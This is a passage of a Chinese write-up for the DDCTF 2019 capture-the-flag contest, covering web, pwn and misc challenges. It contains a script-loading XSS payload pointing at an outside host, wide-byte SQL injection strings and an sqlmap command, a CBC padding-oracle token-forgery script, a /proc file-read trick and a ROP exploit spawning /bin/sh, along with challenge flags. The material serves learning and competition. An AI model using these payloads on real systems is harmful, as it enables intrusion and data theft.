src=//xsspt.com/NyU2Mx>`，获取到`admin.php`的html源码
        DDCTF报名列表
                    姓名
                    昵称
                    备注
                    时间
                     321 
                     3333 
                     2019-04-17 02:02:46 
                        报名
                 接口 -->
访问`http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php`提示需要参数`id`，添加参数后没有回显。
下午各种测试无回显，晚上进行测试发现是，简单测试一下
然后开始手工注入
    id=-1%bf%27+union+select+1,2,3,4,group_concat(schema_name)+from+information_schema.schemata%23
    information_schema,ctfdb,say
    ###########################
    id=-1%bf%27+union+select+1,2,3,4,group_concat(table_name)+from+information_schema.tables+where+table_schema=concat(char(99),char(116),char(102),char(100),char(98))%23
    ctf_fhmHRPL5
    ###########################
    id=-1%bf%27+union+select+1,2,3,4,group_concat(column_name)+from+information_schema.columns+where+table_name=concat(char(99),char(116),char(102),char(95),char(102),char(104),char(109),char(72),char(82),char(80),char(76),char(53))%23
    ctf_value
    ##########################
    id=-1%bf%27+union+select+1,2,3,4,ctf_value+from+ctfdb.ctf_fhmHRPL5%23
    DDCTF{GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS}
当然用sqlmap也是可以的，命令如下：
    python sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --dbms Mysql --dbs --hex
### 再来1杯Java
绑定Host访问：
116.85.48.104 c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com
提示1：JRMP
进入网站提示：`Try to become an administrator.`，留意到cookie中有token字段，在
中可以查询到解密结果为`{"id":100,"roleAdmin":false}`，那么思路就是CBC字节反转，伪造token为`{"id":100,"roleAdmin":true}`，脚本如下：
    import requests
    def sxor(a,b):
        return ''.join([chr(ord(x)^ord(y)) for x,y in zip(a,b)])
    def pad(string,N):
        l=len(string)
        if l!=N:
            return string+chr(N-l)*(N-l)
    def get_api(ciphertext):
        req_header={'X-Forwarded-For': '113.71.226.6',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063',
    'Host':'c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023',
    'Referer':'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/home',
    'Cookie':'token={}'.format(ciphertext.encode('base64')[:-1]),
    }
        s = requests.session() 
        rsp=s.get('http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token', headers=req_header,timeout=2,verify=False,stream=True,allow_redirects=False)
        return(rsp.content) 
    def padding_oracle(cipher, N):
        get = ""
        for i in xrange(1, N + 1):
            for j in xrange(0, 256):
                padding = sxor(get, chr(i) * (i - 1))
                c = chr(0) * (N - i) + chr(j) + padding + cipher
                payload='PadOracle:iv/cbc' + c
                get_api_return=get_api(payload)
                if "decrypt err~" not in get_api_return:
                    get = chr(j ^ i) + get
                    # print(get.encode('hex'))
                    break
        return get
    token = 'UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF'.decode('base64')
    ciphertxt = token[16:]
    iv = token[:16] # PadOracle:iv/cbc
    org_plaintxt = '{"id":100,"roleAdmin":false}\x04\x04\x04\x04'
    evil_plaintxt = '{"id":100,"roleAdmin":true}\x05\x05\x05\x05\x05'
    ciphertxt2 = ciphertxt[16:]
    imtermediary2 = sxor(org_plaintxt[16:],ciphertxt[:16])
    # print imtermediary2.encode('hex')
    ciphertxt1 = sxor(evil_plaintxt[16:],imtermediary2)
    # print sxor(imtermediary2,evil_plaintxt[16:]).encode('hex'),evil_plaintxt[16:]
    imtermediary1 = padding_oracle(ciphertxt1, 16)
    # print imtermediary1.encode('hex')
    iv_fixed = sxor(imtermediary1,org_plaintxt[:16])
    # 
    print (iv_fixed+ciphertxt1+ciphertxt2).encode('base64')
修改token为`e/0YtlMi8D4jOD4Uk+gE2sO+7uQmXLN5LEM2W9Y6VRa42FqRvernmQhsxyPnvxaF`
得到了一个1.txt
    Try to hack~ 
    Hint:
    1. Env: Springboot + JDK8(openjdk version "1.8.0_181") + Docker~ 
    2. You can not exec commands~
发现可以任意文件读取
`/proc/self/fd/xxx` 可以查看该进程打开的文件，经测试访问
`/api/fileDownload?fileName=/proc/self/fd/15` 拿到网站源码
反编译class文件后拿到java源码，有一个DeserializeDemoController比较可疑
fastjson 版本是 1.2.51 好像没有漏洞，而且用了SerialKiller。1.txt 提示无法执行命令。
【未完待续】
## MISC
### [PWN] strike
    [*] '/home/kira/pwn/ddctf/xpwn'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
漏洞一：无初始化内存，导致内存泄露
    int __cdecl sub_80485DB(FILE *stream, FILE *a2)
    {
      int v2; // eax
      char buf; // [esp+0h] [ebp-48h]
      printf("Enter username: ");
      v2 = fileno(stream);
      read(v2, &buf, 0x40u);
      return fprintf(a2, "Hello %s", &buf);
    }
动态调试，可以发现内存里面有栈地址，以及libc地址，填充0x28位字符，即可泄露
漏洞二：输入长度为有符号数，长度判断没有判断是否为负数，导致栈溢出
    int __cdecl main(int a1)
    {
      int v1; // eax
      char buf; // [esp+0h] [ebp-4Ch]
      size_t nbytes; // [esp+40h] [ebp-Ch]
      int *v5; // [esp+44h] [ebp-8h]
      v5 = &a1;
      setbuf(stdout, 0);
      input_name(stdin, stdout);
      sleep(1u);
      printf("Please set the length of password: ");
      nbytes = get_int();
      if ( (signed int)nbytes > 63 ) // 负数绕过
      {
        puts("Too long!");
        exit(1);
      }
      printf("Enter password(lenth %u): ", nbytes);
      v1 = fileno(stdin);
      read(v1, &buf, nbytes);
      puts("All done, bye!");
      return 0;
    }
长度那里输入`-1`，即可获得`4294967295`长度的输入，不过这里不是一般的栈溢出，具体需要分析汇编代码
    .text:08048732                 add     esp, 10h
    .text:08048735                 mov     eax, 0
    .text:0804873A                 lea     esp, [ebp-8]
    .text:0804873D                 pop     ecx
    .text:0804873E                 pop     ebx
    .text:0804873F                 pop     ebp
    .text:08048740                 lea     esp, [ecx-4]
    .text:08048743                 retn
留意到程序最后`lea esp,
[ecx-4]`，那么要控制`esp`就需要控制`ecx`。而`ecx`的值为`ebp-8`处的值，那么我们需要覆盖`ebp-8`为我们可控的栈空间地址。通过漏洞一，已经知道栈地址和libc基址，可以在第二次输入的开头构造ROP，然后控制`ecx`的值为ROP地址`+4`。
    p.sendlineafter('username: ','1'*0x27)
    p.recvuntil('1'*0x27+'\n')
    stack = u32(p.recv(4))
    success(hex(stack))
    libc.address = u32(p.recv(4)) - libc.sym['setbuf'] - 21
    success(hex(libc.address))
    p.sendlineafter('password: ','-1')
    p.sendlineafter('): ',flat(libc.sym['system'],0,libc.search('/bin/sh').next()).ljust(68,'a')+p32(stack-0x4c+4))
    p.recvuntil('bye!\n')
    p.interactive()
### wireshark
检查http包的过程中，发现有PNG的文件头，提取图片找到一个钥匙图片，调整一下分辨率，发现底部有一个key
    key:57pmYyWt
继续查找，还发现两个一样的美女傻笑图，不过有一张特别大。
然后根据跟踪http的信息，可以猜测出题人使用在线加密工具（
地址是：
），将flag隐藏在图片中，密码就是刚刚找到的key。
    GET /aideddesign/img_add_info HTTP/1.1
    Host: tools.jb51.net
    User-Agent: curl/7.54.0
    Accept: */*
使用刚才找到的较大那张美女傻笑图，用key进行解密，可以得到隐藏的信息
    图片中隐藏的信息为：flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-
HEX解一下得到flag
    DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}
### 北京地铁
Color Threshold
提示：AES ECB密钥为小写字母
提示2：密钥不足位用\0补全
提示3：不要光记得隐写不看图片本身啊...
[下载地址](https://ddctf.didichuxing.com/files/493054389fbb6a9ff9924e7adf332d33/bmp.zip)
RGB LSB隐写得到密文`iKk/Ju3vu4wOnssdIaUSrg==`
秘钥需要在图片上寻找了。题目提示`Color
threshold`，所以是在颜色上做文章。经观察，魏公村站颜色与同路线略有不同，所以尝试密码`weigongcun\x00\x00\x00\x00\x00\x00`，使用AES-ECB解密，成功得到flag
    from Crypto.Cipher import AES